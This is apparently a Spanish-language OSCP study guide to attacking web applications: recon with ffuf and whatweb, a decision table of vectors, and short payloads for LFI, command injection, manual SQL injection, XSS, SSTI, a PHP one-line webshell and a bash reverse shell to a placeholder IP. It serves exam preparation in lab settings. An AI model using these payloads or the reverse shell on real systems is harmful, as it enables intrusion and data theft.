# 09 — Ataques web (guía)

Cómo abordar un objetivo web **en orden** y **cómo decidir** qué probar. Los comandos y payloads
exhaustivos están en la chuleta [`../cheatsheets/web.md`](../cheatsheets/web.md).

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

> Fuente principal: [oscp.adot8.com — Web Applications](https://oscp.adot8.com/web-applications/checklist).
> ⚠️ **`sqlmap` PROHIBIDO** (explotación automática): la SQLi se hace **a mano**.

---

## El flujo web

```text
1. IDENTIFICAR      whatweb, headers, versión exacta
2. DESCUBRIR        dirs + vhosts + extensiones (en 2º plano)
3. LEER LA APP      robots, sitemap, código fuente, .git, requests en Burp
4. DECIDIR          ¿qué vector? (tabla de decisión)
5. EXPLOTAR         LFI / upload / SQLi / cmd-inj / SSRF / SSTI ...
6. FOOTHOLD         de RCE a shell interactiva real
7. DOCUMENTAR       capturas y comandos AL MOMENTO
```

> **El ataque más común es LFI.** Si hay un parámetro que incluye ficheros, probalo primero.

---

## 1. Identificar y descubrir

```bash
whatweb -a 3 http://<IP>
curl -sI http://<IP>                       # headers, server, redirects
nmap -sCV -p80,443 --script "http-title,http-headers,http-enum,http-robots,http-git" <IP>
```

```bash
# Directorios/ficheros — en SEGUNDO PLANO mientras seguís
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -mc 200,204,301,302,307,401,403 -t 50

# Virtual hosts — cambia el juego más seguido de lo que creés
ffuf -u http://<IP>/ -H "Host: FUZZ.<dominio>" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -mc 200,301,302,401,403 -fs <tamaño_default>

# Extensiones sobre una ruta que ya te interesa
ffuf -u http://<IP>/ruta/FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
```

**Siempre mirá**: `robots.txt`, `sitemap.xml`, comentarios HTML, `.git/`, `/.env`, `/backup`,
`/.htaccess`, `/assets/` (OffSec esconde cosas ahí).

> **Truco**: visitá **todos** los puertos HTTP por **IP y por FQDN**. A veces solo uno revela algo.
> Y **no podés hacer GET a una ruta → probá otros métodos** (POST/PUT/OPTIONS…).

---

## 2. Leer la aplicación

- **Tecnología y versión** → `searchsploit <cms> <versión exacta>`.
- **Código fuente**: `Ctrl+U`, `.git` expuesto → `git-dumper`.
- **Burp**: revisá cada request/response; parámetros ocultos, cookies, APIs internas.
- **Fuzzeá parámetros**: `ffuf -u 'http://<IP>/page.php?FUZZ=id' -w burp-parameter-names.txt`.

---

## 3. Tabla de decisión — qué probar según lo que ves

| Lo que ves | Vector a probar |
| --- | --- |
| `?file=`, `?page=`, `?path=`, `?include=` | **LFI / directory traversal** (lo más común) |
| Formulario de subida | **File upload** (webshell → reverse shell real) |
| Campo que llega al SO (`ping`, `host`…) | **Command injection** |
| `'` produce error / login raro | **SQL injection** (manual) |
| Input que pide una URL | **SSRF** |
| `{{7*7}}` → `49` | **SSTI** |
| Refleja tu input | **XSS** |
| `/api/`, `/v1/`, JSON | **APIs** (fuzz de rutas/parámetros) |
| WordPress/Joomla/Tomcat/Jenkins… | **App conocida**: versión → CVE |

---

## 4. Vectores (resumen; comandos en la chuleta)

### 4.1 LFI / Directory Traversal → RCE

```text
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

Si podés **escribir un log** que después incluís → **log poisoning** (User-Agent con `<?php ...?>`).
Si hay `include($_GET['page'])` y no podés envenenar logs → **PHP filter chains**
(`php_filter_chain_generator.py`). RFI si `allow_url_include=On`.

### 4.2 File Upload

Bypass de validación: **extensiones alternativas**, **magic bytes**, **`.htaccess`** (`AddType`),
doble extensión. Luego **de webshell a reverse shell real**.

### 4.3 Command Injection

```text
; whoami    & whoami #    | whoami    `whoami`    $(whoami)
cat${IFS}file.txt          # si no hay espacios
```

### 4.4 SQL Injection (manual)

1. Detectar: `'` → error; `' or 1=1-- -`; `' order by N-- -` (columnas); `union select`.
2. Extraer: según motor (MySQL `information_schema`, MSSQL `sysobjects`, Postgres `pg_*`).
3. A RCE: `INTO OUTFILE` (MySQL) · `xp_cmdshell` (MSSQL) · `COPY FROM PROGRAM` (Postgres).

> Payloads completos por motor: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
> y [`../cheatsheets/mssql-injection.md`](../cheatsheets/mssql-injection.md).

### 4.5 SSRF

`http://127.0.0.1` en cualquier campo que pida URL; fuzzeá puertos internos con `ffuf -request`.

### 4.6 XSS y SSTI

- XSS: robar cookies / forzar navegación (`<img src=x onerror=...>`).
- SSTI: `{{7*7}}` → RCE (Jinja2/Twig/Freemarker/Java).

### 4.7 APIs

Fuzzeá parámetros (`burp-parameter-names.txt`), rutas `/api/v1`, y **WAF bypass** con
`X-Forwarded-For: 127.0.0.1`.

### 4.8 Apps conocidas

Version exacta → `searchsploit`/CVE. WordPress: `wpscan -e vp,cb,p`; mirá `wp-content/plugins`.

---

## 5. Foothold — de RCE a shell

```php
<?php system($_GET['cmd']); ?>
```

```bash
bash -c 'bash -i >& /dev/tcp/<TU_IP>/1337 0>&1'
```

> **Recordá**: una **webshell NO es shell válida** para los flags. Conseguí **reverse shell
> interactiva** antes de tocar `local.txt`/`proof.txt`. Ver [`00-reglas-examen.md`](00-reglas-examen.md).

---

## 6. Errores comunes

| Error | Por qué duele |
| --- | --- |
| No hacer `-p-`/vhosts | No ves la app vulnerable |
| Explotar antes de leer el código fuente | Te perdés la pista |
| Usar `sqlmap` | **Prohibido** → cero puntos |
| Webshell como shell de trabajo | **Cero puntos** en esa máquina |
| No documentar al momento | El reporte es final |

---

## Referencias

- [`../cheatsheets/web.md`](../cheatsheets/web.md) — **todos los comandos y payloads**
- [`02-enumeracion-servicios.md`](02-enumeracion-servicios.md) — 80/443 y servicios
- [`../cheatsheets/lfi-rce.md`](../cheatsheets/lfi-rce.md) · [`../cheatsheets/mssql-injection.md`](../cheatsheets/mssql-injection.md)
- [oscp.adot8.com — Web Applications](https://oscp.adot8.com/web-applications/checklist) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
